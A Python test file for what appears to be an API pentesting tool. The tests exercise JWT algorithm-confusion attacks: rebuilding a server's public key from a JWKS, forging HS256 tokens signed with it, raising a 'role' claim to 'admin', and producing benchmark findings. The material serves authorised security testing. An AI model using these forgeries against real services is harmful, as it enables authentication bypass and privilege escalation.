"""JWT algorithm confusion (RS→HS), distilled from *Pentesting APIs* (Ch. 4/8, crAPI key-confusion). A
verifier that picks the algorithm from the attacker-controlled header can be tricked into HMAC-verifying
with the server's PUBLIC key as the secret — a public value becomes a forgery secret. The confirmation is
DETERMINISTIC: the forged HS256 token (HMAC-signed with the public key) must be ACCEPTED where a
signature-tampered token is REJECTED, so an accept-anything endpoint can never produce a false positive."""
import json

import blind_benchmark as bb
import jwt_tool as jt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa


def _keypair():
    priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    pub = priv.public_key()
    nums = pub.public_numbers()

    def _b64(i):
        return jt.b64url_encode(i.to_bytes((i.bit_length() + 7) // 8, "big"))

    jwk = {"kty": "RSA", "n": _b64(nums.n), "e": _b64(nums.e)}
    pem = pub.public_bytes(serialization.Encoding.PEM,
                           serialization.PublicFormat.SubjectPublicKeyInfo).decode()
    return priv, jwk, pem


def test_first_rsa_pem_reconstructs_the_public_key():
    _, jwk, pem = _keypair()
    got = jt.first_rsa_pem(json.dumps({"keys": [jwk]}))
    assert got.strip() == pem.strip()          # JWKS -> exact SPKI PEM
    assert jt.first_rsa_pem(json.dumps(jwk)).strip() == pem.strip()   # bare JWK too
    assert jt.first_rsa_pem('{"keys":[]}') == ""


def test_forged_hs256_is_accepted_by_a_naive_public_key_verifier():
    # A NAIVE verifier trusts the header alg and, for HS256, HMACs with the public-key PEM it holds for
    # this issuer. That is exactly the vulnerable path — the forged token must verify against it.
    _, _, pem = _keypair()
    secret = jt.pubkey_secret_variants(pem)[0]
    forged = jt.forge_key_confusion(jt.escalate_payload({"sub": "carlos", "role": "user"}), secret)
    d = jt.decode_jwt(forged)
    assert d["header"]["alg"] == "HS256" and d["payload"].get("role") == "admin"
    assert jt.verify_hs(forged, secret)                       # the naive verifier accepts it
    assert not jt.verify_hs(forged, "unrelated-secret")       # not a universal accept


def test_pubkey_secret_variants_cover_trailing_newline_forms():
    _, _, pem = _keypair()
    v = jt.pubkey_secret_variants(pem)
    assert any(s.endswith("\n") for s in v) and any(not s.endswith("\n") for s in v)
    assert jt.pubkey_secret_variants("") == []


def test_tamper_signature_yields_a_token_a_sound_verifier_rejects():
    _, _, pem = _keypair()
    secret = jt.pubkey_secret_variants(pem)[0]
    forged = jt.forge_key_confusion(jt.escalate_payload({"role": "user"}), secret)
    broken = jt.tamper_signature(forged)
    assert broken != forged and jt.verify_hs(forged, secret) and not jt.verify_hs(broken, secret)


def test_jwks_candidate_urls_are_origin_scoped():
    urls = jt.jwks_candidate_urls("https://api.example.com/identity/v2/user")
    assert "https://api.example.com/.well-known/jwks.json" in urls
    assert all(u.startswith("https://api.example.com/") for u in urls)


def test_key_confusion_finding_is_benchmark_proof():
    f = jt.key_confusion_finding("https://api.example.com/user", "Forged -> HTTP 200; tampered -> HTTP 401.")
    assert f["family"] == "jwt" and f["cwe"] == "CWE-347"
    assert f["confidence"] == "confirmed" and f["severity"] == "critical" and f["cvss_score"] == 9.1
    assert bb._has_proof(f)
